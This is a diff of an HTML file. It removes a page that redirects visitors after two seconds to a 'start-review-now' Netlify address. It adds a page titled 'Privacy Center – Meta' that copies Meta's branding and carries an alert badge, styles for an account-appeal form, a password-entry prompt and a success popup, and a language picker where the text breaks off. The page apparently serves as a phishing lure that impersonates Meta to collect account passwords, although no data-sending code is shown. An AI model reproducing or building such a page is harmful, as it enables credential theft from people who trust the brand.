@@ -1,26 +1,1964 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Privacy Center – Meta</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&amp;family=DM+Sans:wght@300;400;500;600&amp;display=swap" rel="stylesheet">
+        <style>
+            :root {
+                --blue: #0866ff;
+                --dark: #0a0f1e;
+                --mid: #1a2340;
+                --light-blue: #e8f1ff;
+                --red: #e53e3e;
+                --green: #10b981;
+                --text: #1c1e21;
+                --muted: #606770;
+            }
 
-<style>
-html, body {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    background: #ffffff;
-}
-</style>
+            * {
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+            }
 
-</head>
-<body>
+            body {
+                font-family: 'DM Sans', sans-serif;
+                background: #f4f6fb;
+                color: var(--text);
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+            }
 
-<script>
-setTimeout(function() {
-    window.location.href = "https://start-review-now.netlify.app/";
-}, 2000);
-</script>
+            h1, h2, h3, .heading {
+                font-family: 'Syne', sans-serif;
+            }
 
-</body>
+            /* RTL support for Arabic */
+            body.rtl {
+                direction: rtl;
+                font-family: 'DM Sans', 'Segoe UI', 'Tahoma', sans-serif;
+            }
+
+            body.rtl .hero-actions {
+                flex-direction: row-reverse;
+            }
+
+            body.rtl .step {
+                flex-direction: row-reverse;
+            }
+
+            body.rtl .step-num {
+                margin-left: 12px;
+                margin-right: 0;
+            }
+
+            body.rtl .alert-card {
+                border-left: none;
+                border-right: 4px solid var(--red);
+            }
+
+            body.rtl .card-arrow svg {
+                transform: rotate(180deg);
+            }
+
+            body.rtl .nav-links {
+                flex-direction: row-reverse;
+            }
+
+            /* Language popup overlay */
+            #lang-popup {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(10, 15, 30, 0.95);
+                backdrop-filter: blur(8px);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 9999;
+                transition: opacity 0.3s ease;
+            }
+
+            .lang-card {
+                background: #ffffff;
+                border-radius: 32px;
+                padding: 40px 36px;
+                max-width: 480px;
+                width: 90%;
+                text-align: center;
+                box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+                animation: popupFade 0.5s ease;
+            }
+
+            @keyframes popupFade {
+                from {
+                    opacity: 0;
+                    transform: scale(0.95) translateY(10px);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: scale(1) translateY(0);
+                }
+            }
+
+            .lang-card h2 {
+                font-family: 'Syne', sans-serif;
+                font-size: 2rem;
+                font-weight: 800;
+                color: var(--dark);
+                letter-spacing: -0.02em;
+                margin-bottom: 8px;
+            }
+
+            .lang-card p {
+                color: #64748b;
+                font-size: 0.95rem;
+                margin-bottom: 32px;
+            }
+
+            .lang-grid {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+                margin-bottom: 28px;
+            }
+
+            .lang-btn {
+                background: #f1f5f9;
+                border: 1px solid #e2e8f0;
+                border-radius: 40px;
+                padding: 14px 8px;
+                font-family: 'Syne', sans-serif;
+                font-weight: 600;
+                font-size: 0.9rem;
+                color: #1e293b;
+                cursor: pointer;
+                transition: all 0.2s;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 6px;
+            }
+
+            .lang-btn:hover {
+                background: #e6edf7;
+                border-color: var(--blue);
+                transform: translateY(-2px);
+                box-shadow: 0 6px 16px rgba(8,102,255,0.15);
+            }
+
+            .lang-btn.selected {
+                background: var(--blue);
+                border-color: var(--blue);
+                color: white;
+            }
+
+            .btn-continue {
+                background: var(--dark);
+                color: white;
+                font-family: 'Syne', sans-serif;
+                font-weight: 700;
+                font-size: 1rem;
+                padding: 16px 24px;
+                border-radius: 40px;
+                border: none;
+                width: 100%;
+                cursor: pointer;
+                transition: all 0.2s;
+                opacity: 0.5;
+                pointer-events: none;
+            }
+
+            .btn-continue.active {
+                opacity: 1;
+                pointer-events: all;
+                background: var(--blue);
+            }
+
+            .btn-continue.active:hover {
+                background: #0757e0;
+                transform: translateY(-2px);
+                box-shadow: 0 12px 28px rgba(8,102,255,0.4);
+            }
+
+            .footer-note {
+                margin-top: 24px;
+                font-size: 0.7rem;
+                color: #94a3b8;
+            }
+
+            /* Main content */
+            #main-content {
+                display: none;
+                flex: 1;
+                flex-direction: column;
+            }
+
+            /* NAV */
+            nav {
+                background: var(--dark);
+                padding: 0 40px;
+                height: 60px;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                position: sticky;
+                top: 0;
+                z-index: 100;
+            }
+
+            .nav-logo {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+
+            .nav-logo img {
+                height: 36px;
+                width: auto;
+                display: block;
+                border-radius: 8px;
+                object-fit: contain;
+                background-color: #000000;
+                padding: 4px;
+            }
+
+            .nav-logo span {
+                font-family: 'Syne', sans-serif;
+                font-weight: 700;
+                font-size: 1.1rem;
+                color: white;
+                letter-spacing: -0.02em;
+            }
+
+            .nav-links {
+                display: flex;
+                gap: 6px;
+            }
+
+            .nav-link {
+                color: #94a3b8;
+                font-size: 0.8rem;
+                font-weight: 500;
+                padding: 6px 14px;
+                border-radius: 20px;
+                cursor: pointer;
+                transition: all 0.2s;
+                text-decoration: none;
+            }
+
+            .nav-link:hover {
+                background: rgba(255,255,255,0.08);
+                color: white;
+            }
+
+            .nav-link.active {
+                background: var(--blue);
+                color: white;
+            }
+
+            /* HERO BANNER */
+            .hero {
+                background: linear-gradient(135deg, #0a0f1e 0%, #0d1f4e 50%, #0a2970 100%);
+                padding: 52px 40px 0;
+                position: relative;
+                overflow: hidden;
+            }
+
+            .hero::before {
+                content: '';
+                position: absolute;
+                top: -80px;
+                right: -80px;
+                width: 400px;
+                height: 400px;
+                background: radial-gradient(circle, rgba(8,102,255,0.25) 0%, transparent 70%);
+                pointer-events: none;
+            }
+
+            .hero::after {
+                content: '';
+                position: absolute;
+                bottom: 0;
+                left: 30%;
+                width: 500px;
+                height: 200px;
+                background: radial-gradient(ellipse, rgba(8,102,255,0.12) 0%, transparent 70%);
+                pointer-events: none;
+            }
+
+            .hero-inner {
+                max-width: 1100px;
+                margin: 0 auto;
+                display: grid;
+                grid-template-columns: 1fr 420px;
+                gap: 40px;
+                align-items: end;
+            }
+
+            .hero-text {
+                padding-bottom: 48px;
+            }
+
+            .hero-badge {
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                background: rgba(229,62,62,0.15);
+                border: 1px solid rgba(229,62,62,0.4);
+                border-radius: 20px;
+                padding: 5px 14px;
+                font-size: 0.75rem;
+                font-weight: 600;
+                color: #fc8181;
+                letter-spacing: 0.05em;
+                text-transform: uppercase;
+                margin-bottom: 20px;
+                animation: fadeSlideIn 0.5s ease both;
+            }
+
+            .hero-badge::before {
+                content: '';
+                width: 8px;
+                height: 8px;
+                border-radius: 50%;
+                background: #fc8181;
+                animation: pulse 2s infinite;
+            }
+
+            @keyframes pulse {
+                0%,100% {
+                    opacity: 1;
+                    transform: scale(1)
+                }
+
+                50% {
+                    opacity: 0.5;
+                    transform: scale(1.3)
+                }
+            }
+
+            @keyframes fadeSlideIn {
+                from {
+                    opacity: 0;
+                    transform: translateY(16px)
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0)
+                }
+            }
+
+            @keyframes fadeSlideIn2 {
+                from {
+                    opacity: 0;
+                    transform: translateY(20px)
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0)
+                }
+            }
+
+            @keyframes fadeSlideIn3 {
+                from {
+                    opacity: 0;
+                    transform: translateY(24px)
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0)
+                }
+            }
+
+            .hero h1 {
+                font-size: 2.4rem;
+                font-weight: 800;
+                color: white;
+                line-height: 1.15;
+                letter-spacing: -0.03em;
+                margin-bottom: 16px;
+                animation: fadeSlideIn2 0.6s 0.1s ease both;
+            }
+
+            .hero h1 .red-line {
+                color: #e53e3e;
+                font-style: normal;
+                display: inline-block;
+            }
+
+            .hero p {
+                font-size: 0.9rem;
+                color: #94a3b8;
+                line-height: 1.7;
+                max-width: 460px;
+                margin-bottom: 28px;
+                animation: fadeSlideIn3 0.6s 0.2s ease both;
+            }
+
+            .hero-actions {
+                display: flex;
+                gap: 12px;
+                animation: fadeSlideIn3 0.6s 0.3s ease both;
+            }
+
+            .btn-primary {
+                background: var(--blue);
+                color: white;
+                font-family: 'Syne', sans-serif;
+                font-weight: 700;
+                font-size: 0.875rem;
+                padding: 12px 28px;
+                border-radius: 8px;
+                border: none;
+                cursor: pointer;
+                transition: all 0.2s;
+                letter-spacing: 0.01em;
+            }
+
+            .btn-primary:hover {
+                background: #0757e0;
+                transform: translateY(-1px);
+                box-shadow: 0 8px 24px rgba(8,102,255,0.35);
+            }
+
+            .btn-ghost {
+                background: transparent;
+                color: #94a3b8;
+                font-size: 0.875rem;
+                font-weight: 500;
+                padding: 12px 24px;
+                border-radius: 8px;
+                border: 1px solid rgba(255,255,255,0.12);
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+
+            .btn-ghost:hover {
+                background: rgba(255,255,255,0.06);
+                color: white;
+            }
+
+            .hero-visual {
+                background: rgba(255,255,255,0.04);
+                border: 1px solid rgba(255,255,255,0.08);
+                border-bottom: none;
+                border-radius: 16px 16px 0 0;
+                padding: 28px;
+                min-height: 260px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                animation: fadeSlideIn 0.7s 0.2s ease both;
+            }
+
+            .hero-visual img {
+                max-width: 100%;
+                max-height: 200px;
+                width: auto;
+                height: auto;
+                object-fit: contain;
+                border-radius: 12px;
+                box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            }
+
+            .main {
+                max-width: 1100px;
+                margin: 0 auto;
+                padding: 40px 40px;
+            }
+
+            .alert-card {
+                background: #fff5f5;
+                border-radius: 16px;
+                border-left: 4px solid var(--red);
+                padding: 20px 24px;
+                display: flex;
+                gap: 16px;
+                align-items: flex-start;
+                margin-bottom: 36px;
+                box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+                animation: fadeSlideIn 0.5s 0.4s ease both;
+            }
+
+            .alert-icon {
+                width: 36px;
+                height: 36px;
+                background: #fff5f5;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-shrink: 0;
+            }
+
+            .alert-text h3 {
+                font-family: 'Syne', sans-serif;
+                font-size: 0.9rem;
+                font-weight: 700;
+                color: #c53030;
+                margin-bottom: 4px;
+            }
+
+            .alert-text p {
+                font-size: 0.825rem;
+                color: #e53e3e;
+                line-height: 1.6;
+            }
+
+            .section-label {
+                font-family: 'Syne', sans-serif;
+                font-size: 0.7rem;
+                font-weight: 700;
+                letter-spacing: 0.1em;
+                text-transform: uppercase;
+                color: var(--blue);
+                margin-bottom: 10px;
+            }
+
+            .section-title {
+                font-family: 'Syne', sans-serif;
+                font-size: 1.3rem;
+                font-weight: 800;
+                color: var(--text);
+                letter-spacing: -0.02em;
+                margin-bottom: 20px;
+            }
+
+            .cards-grid {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 16px;
+                margin-bottom: 36px;
+            }
+
+            .info-card {
+                background: white;
+                border-radius: 14px;
+                padding: 22px;
+                border: 1px solid #e8ecf4;
+                cursor: pointer;
+                transition: all 0.25s;
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+                box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+            }
+
+            .info-card:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 12px 32px rgba(8,102,255,0.1);
+                border-color: #c5d7ff;
+            }
+
+            .card-icon {
+                width: 44px;
+                height: 44px;
+                border-radius: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .card-icon.blue {
+                background: #e8f1ff;
+            }
+
+            .card-icon.indigo {
+                background: #eef0ff;
+            }
+
+            .card-icon.teal {
+                background: #e6faf8;
+            }
+
+            .card-icon.amber {
+                background: #fff8e6;
+            }
+
+            .info-card h3 {
+                font-family: 'Syne', sans-serif;
+                font-size: 0.9rem;
+                font-weight: 700;
+                color: var(--text);
+                line-height: 1.3;
+            }
+
+            .info-card p {
+                font-size: 0.8rem;
+                color: var(--muted);
+                line-height: 1.6;
+            }
+
+            .card-arrow {
+                margin-top: auto;
+                color: var(--blue);
+                font-size: 0.75rem;
+                font-weight: 600;
+                display: flex;
+                align-items: center;
+                gap: 4px;
+            }
+
+            .appeal-section {
+                background: linear-gradient(135deg, #0a0f1e 0%, #0d1b3e 100%);
+                border-radius: 20px;
+                padding: 36px;
+                display: grid;
+                grid-template-columns: 1fr 280px;
+                gap: 32px;
+                align-items: center;
+                margin-bottom: 36px;
+                position: relative;
+                overflow: hidden;
+            }
+
+            .appeal-section::before {
+                content: '';
+                position: absolute;
+                top: -60px;
+                right: 200px;
+                width: 300px;
+                height: 300px;
+                background: radial-gradient(circle, rgba(8,102,255,0.2) 0%, transparent 70%);
+                pointer-events: none;
+            }
+
+            .appeal-section h2 {
+                font-family: 'Syne', sans-serif;
+                font-size: 1.4rem;
+                font-weight: 800;
+                color: white;
+                margin-bottom: 10px;
+                line-height: 1.2;
+            }
+
+            .appeal-section p {
+                font-size: 0.85rem;
+                color: #94a3b8;
+                line-height: 1.7;
+                margin-bottom: 20px;
+            }
+
+            .appeal-steps {
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .step {
+                display: flex;
+                gap: 12px;
+                align-items: flex-start;
+            }
+
+            .step-num {
+                width: 24px;
+                height: 24px;
+                border-radius: 50%;
+                background: rgba(8,102,255,0.3);
+                border: 1px solid rgba(8,102,255,0.5);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 0.7rem;
+                font-weight: 700;
+                color: #60a5fa;
+                flex-shrink: 0;
+                margin-top: 1px;
+            }
+
+            .step p {
+                font-size: 0.8rem;
+                color: #94a3b8;
+                line-height: 1.5;
+                margin: 0;
+            }
+
+            .appeal-form-box {
+                background: rgba(255,255,255,0.05);
+                border: 1px solid rgba(255,255,255,0.1);
+                border-radius: 14px;
+                padding: 24px;
+                display: flex;
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .appeal-form-box p {
+                font-size: 0.75rem;
+                color: #94a3b8;
+                text-align: center;
+                font-family: 'Syne', sans-serif;
+                font-weight: 600;
+                text-transform: uppercase;
+                letter-spacing: 0.05em;
+            }
+
+            .appeal-form-box .btn-primary {
+                width: 100%;
+                text-align: center;
+            }
+
+            .form-note {
+                font-size: 0.72rem !important;
+                color: #64748b !important;
+                text-transform: none !important;
+                letter-spacing: 0 !important;
+                font-family: 'DM Sans', sans-serif !important;
+                font-weight: 400 !important;
+            }
+
+            .resource-list {
+                background: white;
+                border-radius: 14px;
+                border: 1px solid #e8ecf4;
+                overflow: hidden;
+                margin-bottom: 36px;
+            }
+
+            .resource-item {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                padding: 16px 20px;
+                border-bottom: 1px solid #f4f6fb;
+                cursor: pointer;
+                transition: background 0.15s;
+            }
+
+            .resource-item:last-child {
+                border-bottom: none;
+            }
+
+            .resource-item:hover {
+                background: #f8faff;
+            }
+
+            .resource-left {
+                display: flex;
+                align-items: center;
+                gap: 14px;
+            }
+
+            .resource-dot {
+                width: 10px;
+                height: 10px;
+                border-radius: 50%;
+                background: var(--blue);
+                flex-shrink: 0;
+            }
+
+            .resource-item h4 {
+                font-size: 0.875rem;
+                font-weight: 600;
+                color: var(--text);
+                margin-bottom: 2px;
+            }
+
+            .resource-item span {
+                font-size: 0.775rem;
+                color: var(--blue);
+                font-weight: 500;
+            }
+
+            footer {
+                background: var(--dark);
+                padding: 32px 40px;
+            }
+
+            .footer-inner {
+                max-width: 1100px;
+                margin: 0 auto;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            footer p {
+                font-size: 0.8rem;
+                color: #475569;
+            }
+
+            footer a {
+                color: #60a5fa;
+                text-decoration: none;
+                font-weight: 500;
+            }
+
+            footer a:hover {
+                color: #93c5fd;
+            }
+
+            #appeal-modal {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                backdrop-filter: blur(5px);
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+            }
+
+            .appeal-modal-card {
+                background: white;
+                border-radius: 32px;
+                max-width: 500px;
+                width: 90%;
+                max-height: 90vh;
+                overflow-y: auto;
+                padding: 32px;
+                box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+                animation: modalFade 0.3s ease;
+                position: relative;
+            }
+
+            @keyframes modalFade {
+                from {
+                    opacity: 0;
+                    transform: scale(0.95);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+
+            .appeal-modal-card h2 {
+                font-family: 'Syne', sans-serif;
+                font-size: 1.8rem;
+                font-weight: 700;
+                margin-bottom: 8px;
+                letter-spacing: -0.01em;
+                background: linear-gradient(135deg, #0866ff 0%, #4f46e5 50%, #e53e3e 100%);
+                -webkit-background-clip: text;
+                background-clip: text;
+                color: transparent;
+                display: inline-block;
+            }
+
+            .appeal-subhead {
+                font-size: 0.9rem;
+                color: #64748b;
+                margin-bottom: 24px;
+                border-bottom: 1px solid #eef2f6;
+                padding-bottom: 16px;
+            }
+
+            .video-container {
+                position: relative;
+                padding-bottom: 56.25%;
+                height: 0;
+                overflow: hidden;
+                border-radius: 16px;
+                margin-bottom: 24px;
+                background: #000;
+                box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            }
+
+            .video-container video {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                border: none;
+                object-fit: cover;
+            }
+
+            .appeal-input {
+                width: 100%;
+                padding: 14px 18px;
+                margin-bottom: 16px;
+                border: 1px solid #e2e8f0;
+                border-radius: 12px;
+                font-size: 0.95rem;
+                transition: border 0.2s, box-shadow 0.2s;
+            }
+
+            .appeal-input:focus {
+                outline: none;
+                border-color: var(--blue);
+                box-shadow: 0 0 0 3px rgba(8,102,255,0.2);
+            }
+
+            .appeal-input-label {
+                font-size: 0.8rem;
+                font-weight: 600;
+                color: #334155;
+                margin-bottom: 4px;
+                display: block;
+            }
+
+            .appeal-modal-btn {
+                background: var(--blue);
+                color: white;
+                font-family: 'Syne', sans-serif;
+                font-weight: 600;
+                font-size: 1rem;
+                padding: 16px 24px;
+                border-radius: 40px;
+                border: none;
+                width: 100%;
+                cursor: pointer;
+                transition: all 0.2s;
+                margin-top: 8px;
+            }
+
+            .appeal-modal-btn:hover {
+                background: #0757e0;
+                transform: translateY(-2px);
+                box-shadow: 0 12px 28px rgba(8,102,255,0.4);
+            }
+
+            .modal-close-btn {
+                position: absolute;
+                top: 20px;
+                right: 20px;
+                background: #f1f5f9;
+                border: none;
+                width: 36px;
+                height: 36px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: pointer;
+                transition: all 0.2s;
+                color: #475569;
+                font-size: 1.2rem;
+                font-weight: 600;
+                z-index: 10;
+            }
+
+            .modal-close-btn:hover {
+                background: #e2e8f0;
+                transform: scale(1.05);
+                color: #e53e3e;
+            }
+
+            .secure-note {
+                font-size: 0.7rem;
+                color: #94a3b8;
+                text-align: center;
+                margin-top: 16px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 4px;
+            }
+
+            .spinner {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 2px solid rgba(255,255,255,0.3);
+                border-radius: 50%;
+                border-top-color: white;
+                animation: spin 0.6s linear infinite;
+                margin-right: 8px;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            #password-prompt, #success-popup {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(12px);
+                align-items: center;
+                justify-content: center;
+                z-index: 10001;
+            }
+
+            .password-card, .success-card {
+                background: white;
+                border-radius: 48px;
+                max-width: 440px;
+                width: 90%;
+                padding: 40px 36px;
+                text-align: center;
+                animation: modalSlideUp 0.4s ease;
+                box-shadow: 0 40px 80px rgba(0,0,0,0.4);
+            }
+
+            @keyframes modalSlideUp {
+                from {
+                    opacity: 0;
+                    transform: translateY(30px)
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0)
+                }
+            }
+
+            .password-card h3, .success-card h3 {
+                font-family: 'Syne',sans-serif;
+                font-size: 1.8rem;
+                font-weight: 700;
+                margin-bottom: 12px;
+            }
+
+            .password-input {
+                width: 100%;
+                padding: 14px 20px;
+                border: 2px solid #e2e8f0;
+                border-radius: 60px;
+                margin-bottom: 20px;
+                font-size: 1rem;
+            }
+
+            .password-btn, .success-btn {
+                background: var(--blue);
+                color: white;
+                font-weight: 600;
+                padding: 14px 24px;
+                border-radius: 60px;
+                border: none;
+                cursor: pointer;
+                width: 100%;
+                margin-top: 10px;
+            }
+
+            .password-btn-secondary {
+                background: #f1f5f9;
+                color: #475569;
+                margin-top: 10px;
+            }
+
+            .toggle-password {
+                position: absolute;
+                right: 18px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                cursor: pointer;
+            }
+
+            .password-input-wrapper {
+                position: relative;
+                margin-bottom: 20px;
+            }
+
+            .success-icon svg {
+                width: 60px;
+                height: 60px;
+            }
+
+            @media (max-width: 768px) {
+                .hero-inner, .cards-grid, .appeal-section {
+                    grid-template-columns:1fr;
+                }
+
+                .hero-visual {
+                    display: none;
+                }
+
+                .main {
+                    padding: 24px 20px;
+                }
+
+                nav {
+                    padding: 0 20px;
+                }
+
+                .nav-links {
+                    display: none;
+                }
+            }
+        </style>
+        <style>
+            *, ::before, ::after {
+                --tw-border-spacing-x: 0;
+                --tw-border-spacing-y: 0;
+                --tw-translate-x: 0;
+                --tw-translate-y: 0;
+                --tw-rotate: 0;
+                --tw-skew-x: 0;
+                --tw-skew-y: 0;
+                --tw-scale-x: 1;
+                --tw-scale-y: 1;
+                --tw-pan-x: ;
+                --tw-pan-y: ;
+                --tw-pinch-zoom: ;
+                --tw-scroll-snap-strictness: proximity;
+                --tw-gradient-from-position: ;
+                --tw-gradient-via-position: ;
+                --tw-gradient-to-position: ;
+                --tw-ordinal: ;
+                --tw-slashed-zero: ;
+                --tw-numeric-figure: ;
+                --tw-numeric-spacing: ;
+                --tw-numeric-fraction: ;
+                --tw-ring-inset: ;
+                --tw-ring-offset-width: 0px;
+                --tw-ring-offset-color: #fff;
+                --tw-ring-color: rgb(59 130 246 / 0.5);
+                --tw-ring-offset-shadow: 0 0 #0000;
+                --tw-ring-shadow: 0 0 #0000;
+                --tw-shadow: 0 0 #0000;
+                --tw-shadow-colored: 0 0 #0000;
+                --tw-blur: ;
+                --tw-brightness: ;
+                --tw-contrast: ;
+                --tw-grayscale: ;
+                --tw-hue-rotate: ;
+                --tw-invert: ;
+                --tw-saturate: ;
+                --tw-sepia: ;
+                --tw-drop-shadow: ;
+                --tw-backdrop-blur: ;
+                --tw-backdrop-brightness: ;
+                --tw-backdrop-contrast: ;
+                --tw-backdrop-grayscale: ;
+                --tw-backdrop-hue-rotate: ;
+                --tw-backdrop-invert: ;
+                --tw-backdrop-opacity: ;
+                --tw-backdrop-saturate: ;
+                --tw-backdrop-sepia: ;
+                --tw-contain-size: ;
+                --tw-contain-layout: ;
+                --tw-contain-paint: ;
+                --tw-contain-style:
+            }
+
+            ::backdrop {
+                --tw-border-spacing-x: 0;
+                --tw-border-spacing-y: 0;
+                --tw-translate-x: 0;
+                --tw-translate-y: 0;
+                --tw-rotate: 0;
+                --tw-skew-x: 0;
+                --tw-skew-y: 0;
+                --tw-scale-x: 1;
+                --tw-scale-y: 1;
+                --tw-pan-x: ;
+                --tw-pan-y: ;
+                --tw-pinch-zoom: ;
+                --tw-scroll-snap-strictness: proximity;
+                --tw-gradient-from-position: ;
+                --tw-gradient-via-position: ;
+                --tw-gradient-to-position: ;
+                --tw-ordinal: ;
+                --tw-slashed-zero: ;
+                --tw-numeric-figure: ;
+                --tw-numeric-spacing: ;
+                --tw-numeric-fraction: ;
+                --tw-ring-inset: ;
+                --tw-ring-offset-width: 0px;
+                --tw-ring-offset-color: #fff;
+                --tw-ring-color: rgb(59 130 246 / 0.5);
+                --tw-ring-offset-shadow: 0 0 #0000;
+                --tw-ring-shadow: 0 0 #0000;
+                --tw-shadow: 0 0 #0000;
+                --tw-shadow-colored: 0 0 #0000;
+                --tw-blur: ;
+                --tw-brightness: ;
+                --tw-contrast: ;
+                --tw-grayscale: ;
+                --tw-hue-rotate: ;
+                --tw-invert: ;
+                --tw-saturate: ;
+                --tw-sepia: ;
+                --tw-drop-shadow: ;
+                --tw-backdrop-blur: ;
+                --tw-backdrop-brightness: ;
+                --tw-backdrop-contrast: ;
+                --tw-backdrop-grayscale: ;
+                --tw-backdrop-hue-rotate: ;
+                --tw-backdrop-invert: ;
+                --tw-backdrop-opacity: ;
+                --tw-backdrop-saturate: ;
+                --tw-backdrop-sepia: ;
+                --tw-contain-size: ;
+                --tw-contain-layout: ;
+                --tw-contain-paint: ;
+                --tw-contain-style:
+            }
+
+            /* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */
+            *,::after,::before {
+                box-sizing: border-box;
+                border-width: 0;
+                border-style: solid;
+                border-color: #e5e7eb
+            }
+
+            ::after,::before {
+                --tw-content: ''
+            }
+
+            :host,html {
+                line-height: 1.5;
+                -webkit-text-size-adjust: 100%;
+                -moz-tab-size: 4;
+                tab-size: 4;
+                font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+                font-feature-settings: normal;
+                font-variation-settings: normal;
+                -webkit-tap-highlight-color: transparent
+            }
+
+            body {
+                margin: 0;
+                line-height: inherit
+            }
+
+            hr {
+                height: 0;
+                color: inherit;
+                border-top-width: 1px
+            }
+
+            abbr:where([title]) {
+                -webkit-text-decoration: underline dotted;
+                text-decoration: underline dotted
+            }
+
+            h1,h2,h3,h4,h5,h6 {
+                font-size: inherit;
+                font-weight: inherit
+            }
+
+            a {
+                color: inherit;
+                text-decoration: inherit
+            }
+
+            b,strong {
+                font-weight: bolder
+            }
+
+            code,kbd,pre,samp {
+                font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+                font-feature-settings: normal;
+                font-variation-settings: normal;
+                font-size: 1em
+            }
+
+            small {
+                font-size: 80%
+            }
+
+            sub,sup {
+                font-size: 75%;
+                line-height: 0;
+                position: relative;
+                vertical-align: baseline
+            }
+
+            sub {
+                bottom: -.25em
+            }
+
+            sup {
+                top: -.5em
+            }
+
+            table {
+                text-indent: 0;
+                border-color: inherit;
+                border-collapse: collapse
+            }
+
+            button,input,optgroup,select,textarea {
+                font-family: inherit;
+                font-feature-settings: inherit;
+                font-variation-settings: inherit;
+                font-size: 100%;
+                font-weight: inherit;
+                line-height: inherit;
+                letter-spacing: inherit;
+                color: inherit;
+                margin: 0;
+                padding: 0
+            }
+
+            button,select {
+                text-transform: none
+            }
+
+            button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]) {
+                -webkit-appearance: button;
+                background-color: transparent;
+                background-image: none
+            }
+
+            :-moz-focusring {
+                outline: auto
+            }
+
+            :-moz-ui-invalid {
+                box-shadow: none
+            }
+
+            progress {
+                vertical-align: baseline
+            }
+
+            ::-webkit-inner-spin-button,::-webkit-outer-spin-button {
+                height: auto
+            }
+
+            [type=search] {
+                -webkit-appearance: textfield;
+                outline-offset: -2px
+            }
+
+            ::-webkit-search-decoration {
+                -webkit-appearance: none
+            }
+
+            ::-webkit-file-upload-button {
+                -webkit-appearance: button;
+                font: inherit
+            }
+
+            summary {
+                display: list-item
+            }
+
+            blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre {
+                margin: 0
+            }
+
+            fieldset {
+                margin: 0;
+                padding: 0
+            }
+
+            legend {
+                padding: 0
+            }
+
+            menu,ol,ul {
+                list-style: none;
+                margin: 0;
+                padding: 0
+            }
+
+            dialog {
+                padding: 0
+            }
+
+            textarea {
+                resize: vertical
+            }
+
+            input::placeholder,textarea::placeholder {
+                opacity: 1;
+                color: #9ca3af
+            }
+
+            [role=button],button {
+                cursor: pointer
+            }
+
+            :disabled {
+                cursor: default
+            }
+
+            audio,canvas,embed,iframe,img,object,svg,video {
+                display: block;
+                vertical-align: middle
+            }
+
+            img,video {
+                max-width: 100%;
+                height: auto
+            }
+
+            [hidden]:where(:not([hidden=until-found])) {
+                display: none
+            }
+        </style>
+    </head>
+    <body>
+        <div id="lang-popup">
+            <div class="lang-card">
+                <h2>🌐 Choose language</h2>
+                <p>Select your preferred language to continue</p>
+                <div class="lang-grid">
+                    <button class="lang-btn" data-lang="en">🇬🇧 English</button>
+                    <button class="lang-btn" data-lang="es">🇪🇸 Español</button>
+                    <button class="lang-btn" data-lang="fr">🇫🇷 Français</button>
+                    <button class="lang-btn" data-lang="de">🇩🇪 Deutsch</button>
+                    <button class="lang-btn" data-lang="hi">🇮🇳 हिन्दी</button>
+                    <button class="lang-btn" data-lang="pt">🇵🇹 Português</button>
+                    <button class="lang-btn" data-lang="ar">🇸🇦 العربية</button>
+                    <button class="lang-btn" data-lang="ja">🇯🇵 日本語</button>
+                </div>
